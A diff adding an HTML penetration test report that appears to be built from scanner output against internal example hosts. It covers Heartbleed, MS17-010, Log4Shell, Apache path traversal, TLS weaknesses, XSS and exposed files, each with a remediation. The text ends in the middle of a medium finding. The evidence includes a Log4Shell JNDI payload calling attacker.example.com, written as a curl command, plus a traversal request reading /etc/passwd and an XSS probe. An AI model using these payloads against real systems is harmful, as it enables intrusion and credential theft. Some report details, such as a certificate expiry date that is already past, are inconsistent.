@@ -1,0 +1,1822 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Penetration Test Report</title>
+<style>
+  :root {
+    --critical: #dc3545;
+    --high:     #fd7e14;
+    --medium:   #e0a800;
+    --low:      #0d6efd;
+    --info:     #6c757d;
+    --dark:     #1e2a3a;
+    --light:    #f8f9fa;
+    --border:   #dee2e6;
+    --mono:     'Courier New', Courier, monospace;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    font-size: 14px;
+    line-height: 1.6;
+    color: #212529;
+    background: #fff;
+  }
+
+  /* ── Header ── */
+  .report-header {
+    background: var(--dark);
+    color: #fff;
+    padding: 40px 50px;
+  }
+  .report-header h1 { font-size: 28px; font-weight: 700; margin-bottom: 12px; }
+  .report-meta { display: flex; gap: 30px; font-size: 13px; opacity: 0.8; flex-wrap: wrap; }
+  .report-meta span { display: flex; gap: 6px; }
+  .report-meta strong { opacity: 1; color: #fff; }
+
+  /* ── Main content ── */
+  .container { max-width: 1000px; margin: 0 auto; padding: 40px 50px; }
+
+  h2 { font-size: 20px; font-weight: 600; margin: 36px 0 16px; color: var(--dark); border-bottom: 2px solid var(--border); padding-bottom: 6px; }
+  h3 { font-size: 15px; font-weight: 600; margin-bottom: 12px; }
+  h4 { font-size: 13px; font-weight: 600; margin: 14px 0 6px; text-transform: uppercase; letter-spacing: 0.05em; color: #495057; }
+
+  /* ── Executive summary ── */
+  .summary-grid { display: flex; gap: 12px; flex-wrap: wrap; margin-bottom: 24px; }
+  .summary-box {
+    flex: 1 1 120px;
+    border-radius: 6px;
+    padding: 16px 20px;
+    color: #fff;
+    text-align: center;
+  }
+  .summary-box .count { font-size: 32px; font-weight: 700; line-height: 1; }
+  .summary-box .label { font-size: 12px; text-transform: uppercase; letter-spacing: 0.08em; margin-top: 4px; opacity: 0.9; }
+  .bg-critical { background: var(--critical); }
+  .bg-high     { background: var(--high); }
+  .bg-medium   { background: var(--medium); }
+  .bg-low      { background: var(--low); }
+  .bg-info     { background: var(--info); }
+
+  /* ── Severity badge ── */
+  .badge {
+    display: inline-block;
+    padding: 2px 9px;
+    border-radius: 3px;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: #fff;
+    vertical-align: middle;
+  }
+  .badge-critical { background: var(--critical); }
+  .badge-high     { background: var(--high); }
+  .badge-medium   { background: var(--medium); }
+  .badge-low      { background: var(--low); }
+  .badge-info     { background: var(--info); }
+
+  /* ── Finding card ── */
+  .finding-card {
+    border: 1px solid var(--border);
+    border-left: 5px solid #ccc;
+    border-radius: 4px;
+    margin-bottom: 24px;
+    overflow: hidden;
+  }
+  .finding-card.sev-critical { border-left-color: var(--critical); }
+  .finding-card.sev-high     { border-left-color: var(--high); }
+  .finding-card.sev-medium   { border-left-color: var(--medium); }
+  .finding-card.sev-low      { border-left-color: var(--low); }
+  .finding-card.sev-info     { border-left-color: var(--info); }
+
+  .card-header {
+    padding: 14px 20px;
+    background: var(--light);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-bottom: 1px solid var(--border);
+  }
+  .card-header h3 { margin: 0; flex: 1; }
+  .card-body { padding: 16px 20px; }
+
+  /* ── Metadata table ── */
+  .meta-table { border-collapse: collapse; font-size: 13px; margin-bottom: 14px; }
+  .meta-table td { padding: 4px 16px 4px 0; vertical-align: top; }
+  .meta-table td:first-child { font-weight: 600; color: #495057; white-space: nowrap; min-width: 90px; }
+
+  /* ── Evidence ── */
+  pre.evidence {
+    background: #1e2a3a;
+    color: #a8d8a8;
+    font-family: var(--mono);
+    font-size: 12px;
+    line-height: 1.5;
+    padding: 14px 16px;
+    border-radius: 4px;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+    max-height: 400px;
+    overflow-y: auto;
+  }
+
+  /* ── Remediation ── */
+  .remediation {
+    background: #f0f7f0;
+    border-left: 3px solid #28a745;
+    padding: 10px 14px;
+    border-radius: 0 4px 4px 0;
+    font-size: 13px;
+  }
+
+  /* ── References ── */
+  .references { font-size: 12px; }
+  .references a { color: #0d6efd; text-decoration: none; word-break: break-all; }
+  .references a:hover { text-decoration: underline; }
+  .references li { margin-bottom: 3px; }
+
+  /* ── Footer ── */
+  .report-footer {
+    background: var(--light);
+    border-top: 1px solid var(--border);
+    text-align: center;
+    padding: 16px;
+    font-size: 12px;
+    color: #6c757d;
+    margin-top: 60px;
+  }
+
+  @media print {
+    .report-header { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .summary-box   { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    .badge         { -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+  }
+</style>
+</head>
+<body>
+
+<header class="report-header">
+  <h1>Penetration Test Report</h1>
+  <div class="report-meta">
+    <span><strong>Date:</strong> 2026-04-20</span>
+    <span><strong>Author:</strong> </span>
+    
+    <span><strong>Total Findings:</strong> 44</span>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- Executive Summary -->
+  <h2>Executive Summary</h2>
+  <div class="summary-grid">
+    
+    <div class="summary-box bg-critical">
+      <div class="count">6</div>
+      <div class="label">critical</div>
+    </div>
+    
+    <div class="summary-box bg-high">
+      <div class="count">7</div>
+      <div class="label">high</div>
+    </div>
+    
+    <div class="summary-box bg-medium">
+      <div class="count">14</div>
+      <div class="label">medium</div>
+    </div>
+    
+    <div class="summary-box bg-low">
+      <div class="count">11</div>
+      <div class="label">low</div>
+    </div>
+    
+    <div class="summary-box bg-info">
+      <div class="count">6</div>
+      <div class="label">info</div>
+    </div>
+    
+  </div>
+  
+
+  <!-- Findings by severity -->
+  
+  
+  
+  <h2>Critical Findings</h2>
+
+  
+  <div class="finding-card sev-critical">
+    <div class="card-header">
+      <span class="badge badge-critical">critical</span>
+      <h3>Ssl Heartbleed</h3>
+      <small>CVSS 9.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: ssl-heartbleed
+VULNERABLE:
+  The Heartbleed Bug is a serious vulnerability in the OpenSSL cryptographic software library.
+  State: VULNERABLE
+  IDs: CVE:CVE-2014-0160
+  Risk factor: High
+  Description: OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug.
+  References: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade OpenSSL to a patched version (&gt;= 1.0.1g). After patching, revoke and reissue all TLS certificates that may have been exposed, and invalidate all active session tokens.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0160" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2014-0160</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-critical">
+    <div class="card-header">
+      <span class="badge badge-critical">critical</span>
+      <h3>Smb Vuln Ms17 010</h3>
+      <small>CVSS 9.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>dc01.example-corp.local:445/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: smb-vuln-ms17-010
+VULNERABLE:
+  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+  State: VULNERABLE
+  IDs: CVE:CVE-2017-0144  OSVDB:148427
+  Risk factor: HIGH
+  Description: A critical remote code execution vulnerability exists in Microsoft SMBv1 in multiple versions of Microsoft Windows and Windows Server. This was exploited in the WannaCry ransomware campaign.
+  Disclosure date: 2017-03-14
+  References: https://nvd.nist.gov/vuln/detail/CVE-2017-0144
+    https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">This is a critical-severity finding. Apply the vendor-recommended patch or mitigation immediately. Escalate to the system owner and track remediation with a defined deadline (typically 24-72 hours).</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0144" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2017-0144</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-critical">
+    <div class="card-header">
+      <span class="badge badge-critical">critical</span>
+      <h3>Apache Log4j2 Remote Code Execution (Log4Shell)</h3>
+      <small>CVSS 10</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10:8080</code></td></tr>
+        <tr><td>CWE</td><td>CWE-917</td></tr>
+        <tr><td>Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code></td></tr>
+        <tr><td>Source</td><td>nuclei</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Matched at: http://192.168.1.10:8080/api/v1/users
+
+--- Request ---
+GET /api/v1/users HTTP/1.1
+Host: 192.168.1.10:8080
+User-Agent: ${jndi:ldap://attacker.example.com/exploit}
+Accept: */*
+
+
+
+--- Response ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{&#34;users&#34;:[]}
+
+curl: curl -H &#39;User-Agent: ${jndi:ldap://attacker.example.com/exploit}&#39; http://192.168.1.10:8080/api/v1/users</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Update Log4j2 to version 2.17.1 or later. If updating is not immediately possible, set the JVM flag -Dlog4j2.formatMsgNoLookups=true or remove the JndiLookup class from the classpath.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-44228" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2021-44228</a></li>
+        
+        <li><a href="https://logging.apache.org/log4j/2.x/security.html" target="_blank" rel="noopener">https://logging.apache.org/log4j/2.x/security.html</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-critical">
+    <div class="card-header">
+      <span class="badge badge-critical">critical</span>
+      <h3>Apache HTTP Server 2.4.49 - Path Traversal / RCE</h3>
+      <small>CVSS 9.8</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10</code></td></tr>
+        <tr><td>CWE</td><td>CWE-22</td></tr>
+        <tr><td>Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
+        <tr><td>Source</td><td>nuclei</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Matched at: http://192.168.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+
+--- Request ---
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
+Host: 192.168.1.10
+
+
+
+--- Response ---
+HTTP/1.1 200 OK
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+
+curl: curl &#39;http://192.168.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd&#39;</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade Apache HTTP Server to version 2.4.50 or later.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2021-41773</a></li>
+        
+        <li><a href="https://httpd.apache.org/security/vulnerabilities_24.html" target="_blank" rel="noopener">https://httpd.apache.org/security/vulnerabilities_24.html</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-critical">
+    <div class="card-header">
+      <span class="badge badge-critical">critical</span>
+      <h3>SSLv2 Enabled</h3>
+      <small>CVSS 9.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-326</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: SSLv2
+offered</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH &lt; 2048 bits, export-grade). Validate the new cipher-suite profile using testssl.sh after reconfiguration.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-critical">
+    <div class="card-header">
+      <span class="badge badge-critical">critical</span>
+      <h3>OpenSSL Heartbleed (CVE-2014-0160)</h3>
+      <small>CVSS 9.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-119</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: heartbleed
+VULNERABLE, server process has not been restarted!</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Apply the available vendor patch or upgrade to a non-vulnerable version. Enable OS-level mitigations: ASLR, DEP/NX, and stack canaries. Where the component is not directly patchable, consider placing it behind a reverse proxy with request size limits enforced.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0160" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2014-0160</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  
+  
+  
+  
+  <h2>High Findings</h2>
+
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>Http Vuln Cve2021 41773</h3>
+      <small>CVSS 7.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: http-vuln-cve2021-41773
+VULNERABLE:
+  Apache HTTP Server 2.4.49 Path Traversal and RCE
+  State: VULNERABLE
+  IDs: CVE:CVE-2021-41773
+  Description: A flaw was found in Apache HTTP Server 2.4.49. Path traversal and remote code execution is possible if mod_cgi is enabled.
+  Disclosure date: 2021-10-04
+  References: https://nvd.nist.gov/vuln/detail/CVE-2021-41773</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Apply the vendor-recommended patch or configuration fix. Track remediation within your vulnerability management workflow with a deadline aligned to your SLA (typically 7-30 days).</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>Apache Tomcat Manager Exposed</h3>
+      <small>CVSS 8.8</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10:8080</code></td></tr>
+        <tr><td>CWE</td><td>CWE-306</td></tr>
+        <tr><td>Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
+        <tr><td>Source</td><td>nuclei</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Matched at: http://192.168.1.10:8080/manager/html
+
+--- Request ---
+GET /manager/html HTTP/1.1
+Host: 192.168.1.10:8080
+
+
+
+--- Response ---
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic realm=&#34;Tomcat Manager Application&#34;
+
+
+curl: curl http://192.168.1.10:8080/manager/html</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Restrict access to the Tomcat Manager application using IP allowlist or remove it entirely from production instances. Change default credentials if the application must remain exposed.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>HTTP/2 Rapid Reset Attack</h3>
+      <small>CVSS 7.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>https://192.168.1.10</code></td></tr>
+        <tr><td>CWE</td><td>CWE-400</td></tr>
+        <tr><td>Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
+        <tr><td>Source</td><td>nuclei</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Matched at: https://192.168.1.10
+
+--- Request ---
+PRI * HTTP/2.0
+
+SM
+
+SETTINGS[0]
+RST_STREAM[...x1000]
+
+--- Response ---
+Server accepted rapid reset streams — vulnerable</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Apply vendor patches for your web server. For Apache, upgrade to 2.4.58 or later. Alternatively, disable HTTP/2 support until patching is possible.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-44487" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2023-44487</a></li>
+        
+        <li><a href="https://www.cisa.gov/news-events/alerts/2023/10/10/http2-rapid-reset-attack-cve-2023-44487" target="_blank" rel="noopener">https://www.cisa.gov/news-events/alerts/2023/10/10/http2-rapid-reset-attack-cve-2023-44487</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>SSLv3 Enabled (POODLE)</h3>
+      <small>CVSS 7.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-326</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: SSLv3
+offered</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH &lt; 2048 bits, export-grade). Validate the new cipher-suite profile using testssl.sh after reconfiguration.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>OpenSSL CCS Injection (CVE-2014-0224)</h3>
+      <small>CVSS 7.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-310</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: CCS
+VULNERABLE (NOT ok)</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Disable deprecated cryptographic protocols (SSLv2, SSLv3, TLS 1.0, TLS 1.1) and weak cipher suites (RC4, DES, 3DES, NULL, EXPORT). Configure a modern TLS 1.2/1.3-only profile. Refer to Mozilla&#39;s recommended TLS configuration: https://ssl-config.mozilla.org/</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2014-0224" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2014-0224</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>LOGJAM (CVE-2015-4000)</h3>
+      <small>CVSS 7.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-310</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: LOGJAM-common
+VULNERABLE (NOT ok): common prime</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Disable deprecated cryptographic protocols (SSLv2, SSLv3, TLS 1.0, TLS 1.1) and weak cipher suites (RC4, DES, 3DES, NULL, EXPORT). Configure a modern TLS 1.2/1.3-only profile. Refer to Mozilla&#39;s recommended TLS configuration: https://ssl-config.mozilla.org/</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2015-4000" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2015-4000</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-high">
+    <div class="card-header">
+      <span class="badge badge-high">high</span>
+      <h3>Cert Expiry</h3>
+      <small>CVSS 7.5</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: cert_expiry
+Certificate expires in 256 days (2025-01-01)</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Apply the vendor-recommended patch or configuration fix. Track remediation within your vulnerability management workflow with a deadline aligned to your SLA (typically 7-30 days).</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  
+  
+  
+  
+  <h2>Medium Findings</h2>
+
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Ftp Anon</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>ftp01.example-corp.local:21/tcp</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nmap</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Script: ftp-anon
+Anonymous FTP login allowed (FTP code 230)
+drwxr-xr-x    2 0        0            4096 Jan 10 09:00 pub
+drwxr-xr-x    3 0        0            4096 Jan 10 09:00 uploads
+-rw-r--r--    1 0        0              42 Jan 10 09:00 README.txt</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Review the finding details and apply the relevant vendor guidance or security best-practice configuration for this component.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>Reflected Cross-Site Scripting (XSS)</h3>
+      <small>CVSS 6.1</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>http://192.168.1.10</code></td></tr>
+        <tr><td>CWE</td><td>CWE-79</td></tr>
+        <tr><td>Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></td></tr>
+        <tr><td>Source</td><td>nuclei</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Matched at: http://192.168.1.10/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+--- Request ---
+GET /search?q=&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
+Host: 192.168.1.10
+
+
+
+--- Response ---
+HTTP/1.1 200 OK
+
+&lt;html&gt;&lt;body&gt;&lt;p&gt;Results for: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
+
+curl: curl &#39;http://192.168.1.10/search?q=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Apply context-aware output encoding to all user-supplied values rendered in HTML. Implement a Content-Security-Policy header that restricts inline script execution.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank" rel="noopener">https://owasp.org/www-community/attacks/xss/</a></li>
+        
+        <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>TLS 1.0 Enabled</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-326</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: TLS1
+offered with final</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH &lt; 2048 bits, export-grade). Validate the new cipher-suite profile using testssl.sh after reconfiguration.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>SWEET32 Birthday Attack (CVE-2016-2183)</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:443</code></td></tr>
+        <tr><td>CWE</td><td>CWE-326</td></tr>
+        
+        <tr><td>Source</td><td>testssl</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">Finding ID: SWEET32
+VULNERABLE, uses 64 bit block ciphers</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Upgrade to TLS 1.2 at minimum; prefer TLS 1.3. Remove support for weak key exchange mechanisms (DH &lt; 2048 bits, export-grade). Validate the new cipher-suite profile using testssl.sh after reconfiguration.</div>
+      
+
+      
+      <h4>References</h4>
+      <ul class="references">
+        
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-2183" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2016-2183</a></li>
+        
+      </ul>
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>/phpinfo.php: PHP information file detected. This file leaks server configuration, PHP version, loaded extensions, and e</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/phpinfo.php</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /phpinfo.php
+/phpinfo.php: PHP information file detected. This file leaks server configuration, PHP version, loaded extensions, and environment variables.</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Remove or restrict access to phpinfo() pages. These pages disclose server configuration, PHP extensions, environment variables, and file paths that facilitate further attacks.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>/.git/HEAD: Git repository HEAD file is exposed. An attacker can reconstruct the full source code using tools such as gi</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/.git/HEAD</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /.git/HEAD
+/.git/HEAD: Git repository HEAD file is exposed. An attacker can reconstruct the full source code using tools such as git-dumper.</pre>
+      
+
+      
+      <h4>Remediation</h4>
+      <div class="remediation">Block access to the .git directory at the web server level. An exposed .git directory can leak full source code, commit history, and credentials embedded in the codebase.</div>
+      
+
+      
+
+    </div>
+  </div>
+  
+  <div class="finding-card sev-medium">
+    <div class="card-header">
+      <span class="badge badge-medium">medium</span>
+      <h3>/backup.zip: Backup archive is publicly accessible. May contain source code, configuration files, or credentials.</h3>
+      <small>CVSS 5.0</small>
+    </div>
+    <div class="card-body">
+
+      <table class="meta-table">
+        <tr><td>Asset</td><td><code>web01.example-corp.local:80/backup.zip</code></td></tr>
+        
+        
+        <tr><td>Source</td><td>nikto</td></tr>
+      </table>
+
+      
+      <h4>Evidence</h4>
+      <pre class="evidence">URI: /backup.zip
+/backup.zip: Backup archive is publicly accessible. May contain source code, configuration files, or credentials.</pre>
+      
+
+      
